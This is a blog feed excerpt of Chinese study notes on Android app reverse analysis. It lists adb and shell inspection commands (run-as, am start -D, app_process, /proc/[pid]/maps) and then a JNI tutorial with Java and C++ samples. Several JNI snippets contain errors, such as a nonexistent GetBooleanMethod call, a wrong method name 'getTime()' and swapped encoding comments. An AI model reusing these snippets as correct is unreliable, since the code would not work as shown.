<p>​	adb logcat | findstr pname/pip/keyword</p>
<p>​	adb logcat | findstr 包</p>
<p>​	日志信息过滤</p>
<h4 id="3-shell-命令">3. shell 命令</h4>
<p>这儿shell命令是指先运行adb shell 再执行命令 与非shell命令互通</p>
<h5 id="31-run-as">3.1 run-as</h5>
<p>​	在非root设备中查看指定debug模式的包名应用沙盒数据</p>
<p>​	run-as [package name]</p>
<h5 id="32-ps">3.2 ps</h5>
<p>​	查看设备进程信息或者指定进程的线程信息</p>
<p>​	ps | grep 过滤内容</p>
<p>​	ps -t [pid] 查看pid 对应的线程信息</p>
<p>​</p>
<h5 id="33-pm-clear">3.3 pm clear</h5>
<p>​	清空指定包名的应用数据</p>
<p>​	pm clear [packagename]</p>
<h5 id="34-pm-install">3.4 pm install</h5>
<p>​	安装设备中的apk 同adb install</p>
<h5 id="35-pm-uninstall">3.5 pm uninstall</h5>
<p>​	卸载</p>
<h5 id="36-am-start">3.6 am start</h5>
<p>​	启动一个应用</p>
<p>​	am start -n [packname]/[packname].[activity name]</p>
<p>​	am start -D -n    (以debug方式启动)</p>
<h5 id="37-am-startservice">3.7 am startservice</h5>
<p>​	启动一个服务</p>
<p>​	am startservice -n [packagename]/[package name].[service name]</p>
<h5 id="38-am-broadcast">3.8 am broadcast</h5>
<p>​	发送一个广播</p>
<p>​	am broadcast -a [广播动作]</p>
<h5 id="39-netcfg">3.9 netcfg</h5>
<p>​	查看设备的ip地址</p>
<h5 id="310-netstat">3.10 netstat</h5>
<p>​	查看设备的端口号信息</p>
<h5 id="311-app_process">3.11 app_process</h5>
<p>​	运行java代码</p>
<p>​	app_process [运行代码目录]· [运行主类]</p>
<p>​	eg:</p>
<p>​	<code>export CLASSPATH = /data/demo.jar</code></p>
<p>​	<code>exec /system/bin/app_process /data/cn.wdasdkl.Main</code></p>
<h5 id="312-dalvikvm">3.12 dalvikvm</h5>
<p>​	运行dex文件</p>
<p>​	dalvikvm -cp [dex文件] · [运行主类]</p>
<p>​	差不多同上的用处</p>
<h5 id="313-top">3.13 top</h5>
<p>​	查看当前应用CPU的消耗信息。</p>
<p>​	top [-n/-m/-d/-s/-t]</p>
<p>​	-m 最多显示多少个进程</p>
<p>​	-n 刷新次数</p>
<p>​	-d 刷新时间间隔</p>
<p>​	-s 按那一列排序</p>
<p>​	-t 显示线程信息而不是进程</p>
<h5 id="314-getprop">3.14 getprop</h5>
<p>​	查看系统属性</p>
<p>​	getprop [属性值名称]</p>
<p>​	eg：<code>getprop ro.debuggable</code></p>
<p>​	查看设备的信息</p>
<h4 id="4-操作apk-命令">4 操作apk 命令</h4>
<h5 id="41-用aapt-命令操作apk命令">4.1 用aapt 命令操作apk命令</h5>
<p>​	查看apk中的信息以及编辑apk程序包</p>
<p>​	aapt dump xmltree [apk包] · [需要查看的资源文件]</p>
<p>​	eg：<code>aapt dump xmltree demp.apk AndroidManifest.xml</code></p>
<h5 id="42-用dexdump-操作dex-命令">4.2 用dexdump 操作dex 命令</h5>
<p>​	查看dex的详细信息</p>
<p>​	dexdump [dex文件路径]</p>
<h4 id="5-进程命令">5 进程命令</h4>
<pre><code>##### 5.1 查看当前进程的内存加载情况
</code></pre>
<p>​	cat  proc/[pid]/maps   查看当前进程的内存映射信息，比如加载了那些so文件，dex文件等等。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180716134420.png" alt=""></p>
<h5 id="52-查看进程的状态信息">5.2 查看进程的状态信息</h5>
<p>​	cat /proc/[pid]/status</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180716134609.png" alt=""></p>
<h5 id="53-查看当前应用使用的端口号信息">5.3 查看当前应用使用的端口号信息</h5>
<p>​	cat /proc /[pid] / net /     tcp/ tcp6 /udp /udp6</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180716134826.png" alt=""></p>
<h3 id="总结">总结</h3>
<p>​	这章就是一些会用到的命令，后面的学习必不可少的知识点。</p>
]]></content>
        </item>
        
        <item>
            <title>Android应用安全防护和逆向分析 基础篇②</title>
            <link>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</link>
            <pubDate>Fri, 13 Jul 2018 15:01:09 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</guid>
            <description>一、 基础篇② 第二章 Android中NDK的开发 1. 相关环境 相关环境参考另外一篇文章Android安全和开发环境搭建
2. JNI基础 2.1 第一行代码(书上使用Eclipse,我使用AS(简单方便很多)) ​	参考文章Android安全和开发环境搭建中的JNI开发章节
2.2 JNIEnv类型和jobject类型  AS 默认自动生成  public native String stringFromJNI();Java_com_naivete_jni_1study_MainActivity_stringFromJNI(JNIEnv *env,jobject /* this */) {std::string hello = &amp;#34;Hello from C++&amp;#34;;return env-&amp;gt;NewStringUTF(hello.c_str());  JNIEnv类型
通过JNIEnv* 指针就可以对Java端的代码进行操作
Jni的所有函数可以查看jni.h文件
下面是一些函数eg：
  NewObject : 创建Java类中的对象。
  NewString : 创建Java类中的String对象。
  NewArray : 创建类型为Type的数组对象
  GetField: 获取型为Type的字段。
  SetFileld: 设置类型为Type的字段的值。
  GetStaticField: 获取类型为Type的static的字段。</description>
            <content type="html"><![CDATA[<h1 id="一-基础篇">一、 基础篇②</h1>
<h2 id="第二章-android中ndk的开发">第二章 Android中NDK的开发</h2>
<h3 id="1--相关环境">1.  相关环境</h3>
<p>相关环境参考另外一篇文章<a href="https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">Android安全和开发环境搭建</a></p>
<h3 id="2--jni基础">2.  JNI基础</h3>
<h4 id="21-第一行代码书上使用eclipse我使用as简单方便很多">2.1 第一行代码(书上使用Eclipse,我使用AS(简单方便很多))</h4>
<p>​	参考文章<a href="https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">Android安全和开发环境搭建</a>中的JNI开发章节</p>
<h4 id="22--jnienv类型和jobject类型">2.2  JNIEnv类型和jobject类型</h4>
<ul>
<li><strong>AS 默认自动生成</strong></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JAVA" data-lang="JAVA"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> String <span style="color:#a6e22e">stringFromJNI</span><span style="color:#f92672">();</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">Java_com_naivete_jni_1study_MainActivity_stringFromJNI<span style="color:#f92672">(</span>
        JNIEnv <span style="color:#f92672">*</span>env<span style="color:#f92672">,</span>
        jobject <span style="color:#75715e">/* this */</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    std<span style="color:#f92672">::</span>string hello <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello from C++&#34;</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">return</span> env<span style="color:#f92672">-&gt;</span>NewStringUTF<span style="color:#f92672">(</span>hello<span style="color:#f92672">.</span><span style="color:#a6e22e">c_str</span><span style="color:#f92672">());</span>
</code></pre></div><ul>
<li>
<p><strong>JNIEnv类型</strong></p>
<p>通过JNIEnv* 指针就可以对Java端的代码进行操作</p>
<p>Jni的所有函数可以查看jni.h文件</p>
<p>下面是一些函数eg：</p>
<ul>
<li>
<p>NewObject : 创建Java类中的对象。</p>
</li>
<li>
<p>NewString : 创建Java类中的String对象。</p>
</li>
<li>
<p>New<!-- raw HTML omitted -->Array : 创建类型为Type的数组对象</p>
</li>
<li>
<p>Get<!-- raw HTML omitted -->Field: 获取型为Type的字段。</p>
</li>
<li>
<p>Set<!-- raw HTML omitted -->Fileld: 设置类型为Type的字段的值。</p>
</li>
<li>
<p>GetStatic<!-- raw HTML omitted -->Field: 获取类型为Type的static的字段。</p>
</li>
<li>
<p>SetStatic<!-- raw HTML omitted -->Field:设置类型为Typede的static的字段的值。</p>
</li>
<li>
<p>Call<!-- raw HTML omitted -->Method: 调用返回类型为Type的方法。</p>
</li>
<li>
<p>CallStatic<!-- raw HTML omitted -->Method: 调用返回值类型为Type的Static方法</p>
<p>&hellip;..</p>
</li>
</ul>
</li>
<li>
<p><strong>Jobject参数obj</strong></p>
<p>如果native 方法不是static ,obj就代表native方法的实例。</p>
<p>如果narive方法是static,obj 就代表native方法的类的class对象实例。</p>
</li>
<li>
<p><strong>Java和C++中的基本类型的映射关系</strong>：</p>
<p>具体查看jni.h文件的详细说明</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">Java类型</th>
<th align="center">本地类型</th>
<th align="center">JNI定义的别名</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">int</td>
<td align="center">long</td>
<td align="center">jint/jsize</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">_int64</td>
<td align="center">jlong</td>
</tr>
<tr>
<td align="center">byte</td>
<td align="center">signed char</td>
<td align="center">jbyte</td>
</tr>
<tr>
<td align="center">boolean</td>
<td align="center">unsigned char</td>
<td align="center">jboolean</td>
</tr>
<tr>
<td align="center">char</td>
<td align="center">unsigned short</td>
<td align="center">jchar</td>
</tr>
<tr>
<td align="center">short</td>
<td align="center">short</td>
<td align="center">jshort</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">float</td>
<td align="center">jfloat</td>
</tr>
<tr>
<td align="center">double</td>
<td align="center">double</td>
<td align="center">jdouble</td>
</tr>
<tr>
<td align="center">Object</td>
<td align="center">_jobject*</td>
<td align="center">jobject</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><strong>jclass类型</strong></p>
<p>jclass 表示java中的class 类：</p>
<p>JNIEnv 类中有如下几个简单的函数可以取得jclass:</p>
<ul>
<li>
<p>jclass FindClass( const char* clsName):通过类的名称来获取jclass</p>
</li>
<li>
<p>jcalss GetObjectClass( jobject obj ):通过对象实例来获取jcalss,相当于java 中的getclass方法</p>
</li>
<li>
<p>jclass GetSuperClass(jclass obj):通过jclass 可以获取其父类的jclass对象。</p>
</li>
</ul>
</li>
<li>
<p><strong>native中访问Java层代码</strong></p>
<p>常见的应用就是获取类的属性和调用类的方法</p>
<p>JNi在jni.h头文件中定义了jfieldId、jmethodID类型分别代表JAVA端的属性和方法。</p>
<p>使用JNI的以下方法来取得相应的jfieldId、jmethodID：</p>
<ul>
<li>GetFieldID、GetMethodID</li>
<li>GetStaticFieldID、GetStaticMethodID</li>
</ul>
<p>查看jni.h中源函数</p>
</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"> GetFieldID<span style="color:#f92672">(</span>jclass clazz<span style="color:#f92672">,</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> name<span style="color:#f92672">,</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> sig<span style="color:#f92672">)</span>
</code></pre></div><p>​	参数说明：</p>
<ul>
<li>
<p>clazz 方法依赖的类对象的class对象</p>
</li>
<li>
<p>name: 字段的名称</p>
</li>
<li>
<p>sig : 字段的签名</p>
<p>查看签名命令</p>
<p><code> javap -s -p 字节码.class 文件</code></p>
</li>
</ul>
<p>GetMethodID 也能够会的构造函数的jmethodID，创建一个Java对象是可以调用指定的构造方法，eg：</p>
<p><code> env-&gt;GetmethodID(data_class,&quot;&lt;init&gt;&quot;,&quot;()v&quot;);</code></p>
<p>签名的格式：</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th>相应的签名</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">boolean</td>
<td>Z</td>
</tr>
<tr>
<td align="center">byte</td>
<td>B</td>
</tr>
<tr>
<td align="center">chat</td>
<td>C</td>
</tr>
<tr>
<td align="center">short</td>
<td>S</td>
</tr>
<tr>
<td align="center">int</td>
<td>I</td>
</tr>
<tr>
<td align="center">long</td>
<td>L</td>
</tr>
<tr>
<td align="center">float</td>
<td>F</td>
</tr>
<tr>
<td align="center">double</td>
<td>D</td>
</tr>
<tr>
<td align="center">void</td>
<td>V</td>
</tr>
<tr>
<td align="center">object</td>
<td>L用/分割包的完整类名；Ljava/lang/String;</td>
</tr>
<tr>
<td align="center">Array</td>
<td>[签名 [I [Ljava/lang/Object</td>
</tr>
<tr>
<td align="center">Method</td>
<td>(参数类型签名··· .) 返回值类型签名</td>
</tr>
</tbody>
</table>
<p>eg:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> com.naivete.jni_study<span style="color:#f92672">;</span>

<span style="color:#f92672">import</span> java.util.Date<span style="color:#f92672">;</span>

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hello</span> <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> property<span style="color:#f92672">;</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">function</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> foo<span style="color:#f92672">,</span> Date date<span style="color:#f92672">,</span><span style="color:#66d9ef">int</span><span style="color:#f92672">[]</span> arr<span style="color:#f92672">){</span>
        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;function&#34;</span><span style="color:#f92672">);</span>
        <span style="color:#66d9ef">return</span> 0<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">test</span><span style="color:#f92672">();</span>
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span>
JNIEXPORT <span style="color:#66d9ef">void</span> JNICALL
Java_com_naivete_jni_1study_Hello_test(JNIEnv <span style="color:#f92672">*</span>env, jobject instance) {

    <span style="color:#75715e">// TODO
</span><span style="color:#75715e"></span>    jclass helloclazz <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetObjectClass(instance);
    jfieldID field_prop <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetFieldID(helloclazz,<span style="color:#e6db74">&#34;property&#34;</span>,<span style="color:#e6db74">&#34;I&#34;</span>);   <span style="color:#75715e">//取到property字段
</span><span style="color:#75715e"></span>    jmethodID method_fun <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetMethodID(helloclazz,<span style="color:#e6db74">&#34;function&#34;</span>,<span style="color:#e6db74">&#34;ILjava/util/Date;[I)I&#34;</span>); <span style="color:#75715e">//取到function函数
</span><span style="color:#75715e"></span>    env<span style="color:#f92672">-&gt;</span>CallIntMethod(instance,method_fun,<span style="color:#ae81ff">0L</span>,NULL,NULL);
}
</code></pre></div><p>GetStaticFieldID与GetStaticMethodID这两个方法的用法大同小异。</p>
<h4 id="23-jnienv类型中方法的使用">2.3 JNIEnv类型中方法的使用</h4>
<ul>
<li>在java中定义一个属性，再从C++代码中将其设置成另外的值</li>
</ul>
<h5 id="231-native中获取方法的id">2.3.1 native中获取方法的ID</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String TAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello&#34;</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> number <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sayHello</span><span style="color:#f92672">();</span>

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
        Hello hello <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hello<span style="color:#f92672">();</span>
        hello<span style="color:#f92672">.</span><span style="color:#a6e22e">sayHello</span><span style="color:#f92672">();</span>
        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">print</span><span style="color:#f92672">(</span>hello<span style="color:#f92672">.</span><span style="color:#a6e22e">number</span><span style="color:#f92672">);</span>
        Log<span style="color:#f92672">.</span><span style="color:#a6e22e">d</span><span style="color:#f92672">(</span>TAG<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span>hello<span style="color:#f92672">.</span><span style="color:#a6e22e">number</span><span style="color:#f92672">);</span>
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">JNIEXPORT <span style="color:#66d9ef">void</span> JNICALL
<span style="color:#a6e22e">Java_com_naivete_jni_1study_Hello_sayHello</span>(JNIEnv <span style="color:#f92672">*</span>env, jobject instance) {

    <span style="color:#75715e">// TODO
</span><span style="color:#75715e"></span>    jclass helloclazz <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetObjectClass(instance);
    jfieldID id_number <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetFieldID(helloclazz,<span style="color:#e6db74">&#34;number&#34;</span>,<span style="color:#e6db74">&#34;I&#34;</span>); <span style="color:#75715e">//获取numberID
</span><span style="color:#75715e"></span>    jint number <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetIntField(instance,id_number); <span style="color:#75715e">//获取number的值;
</span><span style="color:#75715e"></span>    cout<span style="color:#f92672">&lt;&lt;</span>number<span style="color:#f92672">&lt;&lt;</span>endl;  <span style="color:#75715e">//输出到控制台
</span><span style="color:#75715e"></span>    env<span style="color:#f92672">-&gt;</span>SetIntField(instance,id_number,<span style="color:#ae81ff">100L</span>); <span style="color:#75715e">//设置number的值;注意jint对应c++ long类型
</span><span style="color:#75715e"></span>}
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-2-1.png" alt="1"></p>
<p>JNIEnv 还提供了许多Call<!-- raw HTML omitted -->Method 和CallStatic<!-- raw HTML omitted -->Method 还有CallNovirtual<!-- raw HTML omitted -->Method函数，需要通过GetMethodID来取得相应的方法的jmethodId传入到上述函数的参数中</p>
<p>调用示例方法的三种形式如下：</p>
<p><code>Call&lt;Type&gt;Method(jobject obj,jmethodID id,id,·······); </code> //常用的方式</p>
<p><code>Call&lt;Type&gt;Method(jobject obj,jmethodID id,id,va_list lst);</code> //有指向参数表的va_list变量（很少使用）</p>
<p><code>Call&lt;Type&gt;Method(jobject obj,jmethodID id,id,jvalue * v);</code> //有指向jvalue或jvalue数组指针时用的</p>
<p>jvalue 是union联合体，定义jvalue数组传递到方法中，这样可以包含多种类型的参数：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">union</span> jvalue{
    jboolean z;
    jbytpe   b;
    jchar    c;
    jshort   s;
    jint     i;
    jlong    j;
    jfloat   f;
    jdouble  d;
    jobject  l;
}jvalue;
</code></pre></div><p>比如在Java中有这样一个方法：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">function</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> a<span style="color:#f92672">,</span><span style="color:#66d9ef">double</span> b<span style="color:#f92672">,</span><span style="color:#66d9ef">char</span> c<span style="color:#f92672">){</span>

<span style="color:#960050;background-color:#1e0010">·····</span>

<span style="color:#f92672">}</span>

</code></pre></div><p>1）在C++中使用第一种方法调用function方法：</p>
<p><code>env-&gt;CallbooleanMethod(obj,id_function,10L，3.4，L'a')</code></p>
<p>obj:functon对象，id_function:functiond的id,10L、3.4、L&rsquo;a'是对应的参数。</p>
<p>L&rsquo;a&rsquo; 中的L是因为Java中的字符是Unicode双字节的，而C++中的字节是单字节的，所以要变成宽字符。</p>
<p>2）在C++中使用第三种方法function调用：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">jvalue<span style="color:#f92672">*</span> args <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Jvalue[<span style="color:#ae81ff">3</span>]
args[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">10L</span>;
args[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3.22</span>;
args[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#39;a&#39;</span>;
env<span style="color:#f92672">-&gt;</span>GetBooleanMethod(obj,id_function,args);
<span style="color:#66d9ef">delete</span>[] args;  <span style="color:#75715e">//是否指针堆内存
</span></code></pre></div><h5 id="232-java和c中的多态机制">2.3.2 Java和C++中的多态机制</h5>
<p>JNIEnv中的特殊方法CallNovirtual<!-- raw HTML omitted -->Method。来帮助java调用Java中父类的方法。</p>
<ul>
<li>介绍了-C++和java多态的基础知识。</li>
<li>步骤：
<ul>
<li>获取obj中对象的class 对象 GetObjectClass(obj)</li>
<li>获取java中father字段的id GetFieldID()</li>
<li>获取father字段的对象类型 GetObjectField</li>
<li>获取father对象的class对象 FindClass</li>
<li>获取father对象中function方法ID GetMethodID()</li>
<li>调用父类中的function方法（会执行子类的方法）CallvoidMethod</li>
<li>调用父类中的function方法（会执行父类的方法）CallNonvirtualVoidMethod()</li>
</ul>
</li>
</ul>
<h4 id="24-创建java对象及字符串的操作方法">2.4 创建Java对象及字符串的操作方法</h4>
<h5 id="241-native中创建java对象">2.4.1 native中创建Java对象</h5>
<p>​	两种方法：</p>
<ul>
<li>
<p>第一种：</p>
<p><code> jobject Newobject(jclass clazz,jmethodID methodID,·····)</code></p>
<ul>
<li>clazz 需要创建的Java对象的Class对象。</li>
<li>methodID :传递一个方法的ID: 构造方法</li>
<li>第三个参数：构造函数需要传入的参数值（默认不传递） 默认构造方法返回值签名始终是&rdquo;()V&rdquo;,方法的名称始终是&quot;<!-- raw HTML omitted -->&rdquo;。</li>
</ul>
<p>在C++中构造Java中的Date对象调用方法getTime():</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">jclass clazz_date <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>FindClass(<span style="color:#e6db74">&#34;java/util/Date&#34;</span>); <span style="color:#75715e">//获取date对象
</span><span style="color:#75715e"></span>jmethodID mid_date <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetMethodID(clazz_date,<span style="color:#e6db74">&#34;&lt;init&gt;&#34;</span>,<span style="color:#e6db74">&#34;()V&#34;</span>); <span style="color:#75715e">//获取构造方法的ID
</span><span style="color:#75715e"></span>jobject now <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>NewObject(clazz_date,mid_date); <span style="color:#75715e">//生成Date对象
</span><span style="color:#75715e"></span>jmethodID mid_date_getTime <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetMethodID(clazz_date,<span style="color:#e6db74">&#34;getTime()&#34;</span>,<span style="color:#e6db74">&#34;()J&#34;</span>); <span style="color:#75715e">//获取getTime的ID
</span><span style="color:#75715e"></span>jlong time <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>CallLongMethod(now,mid_date_getTime);<span style="color:#75715e">//调用getTime返回时间
</span><span style="color:#75715e"></span>printf(<span style="color:#e6db74">&#34;%I64d&#34;</span>,time);
</code></pre></div></li>
<li>
<p>第二种：</p>
<p>用AllocObject函数创建一个对象，可以根据传入的jclass创建一个java对象，但是状态时未初始化的，在这个对象之前绝对要用CallNonvirtualVoidMethod来调用该jclass的构造函数这样可以延迟构造函数的调用。用的比较少。</p>
<p>eg：略；</p>
</li>
</ul>
<h5 id="242-native中操作java字符串">2.4.2 native中操作Java字符串</h5>
<p>​	Java-String对象是Unicode(UTF-16)码 一个字符总是占用两个字节 可以通过JNI接口将Java中的字符串转换到C++的宽字符串（wchar_t*),或者传回一个UTF-8编码的字符串（char * )到C++ 反过来同理。</p>
<p>JNIEnv中的一些C++方法：</p>
<p>1）获取字符串的长度：</p>
<p>​	<code> jsize GetStringLength(jstring j_msg)</code></p>
<ol>
<li>将jstring 对象拷贝到const jchar* 指针字符串：</li>
</ol>
<p>​	//拷贝Java字符串并以UTF-8编码传入jstr:</p>
<p>​	<code> env-&gt;GetStringRegion(jstring j_msg.jsize start,jszie len,jchar* jstr);</code></p>
<p>​	////拷贝Java字符串并以UTF-16编码传入jstr:</p>
<p>​	<code> env-&gt;GetStringUTFRegion(jstring j_msg.jsize start,jszie len, char* jstr);</code></p>
<ol start="3">
<li>生成一个jstring 对象</li>
</ol>
<p>​	<code>jobject NewString(const jchar* jstr,int size);</code></p>
<p>​	将字符串指针jstr转换成jstring。</p>
<ol start="4">
<li>将jstring对象转换成const jchar* 字符串指。</li>
</ol>
<ul>
<li>
<p>GetStringChars 开内存 指针指向先开的内存</p>
<p><code>const* jchar * GetStringChars(jstring j_msg,jboolean* copied)</code></p>
<p>返回一个UTF-16编码的宽字符串（jchar*);</p>
<p>对应的释放内存方法：</p>
<p><code>ReleaseStringChars(jstring j_msg,const jchar* jstr)</code></p>
</li>
<li>
<p>GetStringUTFChars 不开内存直接指向Java中string的指针</p>
<p><code> const char* GetStringUTFChars(jstring str,jboolean* copied)</code></p>
<p>取得UTF-8编码的字符串</p>
<p>释放：</p>
<p><code>ReleaseStringUTFChars(jstring j_msg,const jchar* jstr)</code></p>
</li>
</ul>
<ol start="5">
<li>将jstring 对象转化成const jchar* 字符串指针：</li>
</ol>
<p>​	<code>const jchar* GetStringCritical(jstring j_msg,Jboolean* copied)</code></p>
<p>​	作用:增加直接传回指向Java字符串的指针的可能性（而不是拷贝）；</p>
<p>​	在<code>GetStringCritical/ReleaseStringCritical</code>之间的关键区域之间不能调用任何其他JNI函数。否则会造成关键区域代码执行期间垃圾回收器停止工作。任何触发垃圾回收器的的线程也将暂停。</p>
<p>​	释放：</p>
<p>​	<code>ReleaseStringCritical(jstring j_msg,const jchar* jstr)</code></p>
<p>实例eg：（与书上不同,思路大概相同）</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#66d9ef">extends</span> AppCompatActivity <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">private</span> EditText et<span style="color:#f92672">;</span>
    <span style="color:#66d9ef">private</span> TextView tv<span style="color:#f92672">;</span>
    <span style="color:#66d9ef">private</span> Button bt<span style="color:#f92672">;</span>
    <span style="color:#66d9ef">public</span> String text <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>

    <span style="color:#75715e">// Used to load the &#39;native-lib&#39; library on application startup.
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> <span style="color:#f92672">{</span>
        System<span style="color:#f92672">.</span><span style="color:#a6e22e">loadLibrary</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;native-lib&#34;</span><span style="color:#f92672">);</span>
    <span style="color:#f92672">}</span>

    <span style="color:#a6e22e">@Override</span>
    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>Bundle savedInstanceState<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>savedInstanceState<span style="color:#f92672">);</span>
        setContentView<span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">layout</span><span style="color:#f92672">.</span><span style="color:#a6e22e">activity_main</span><span style="color:#f92672">);</span>
        et <span style="color:#f92672">=</span> findViewById<span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">.</span><span style="color:#a6e22e">editText</span><span style="color:#f92672">);</span>
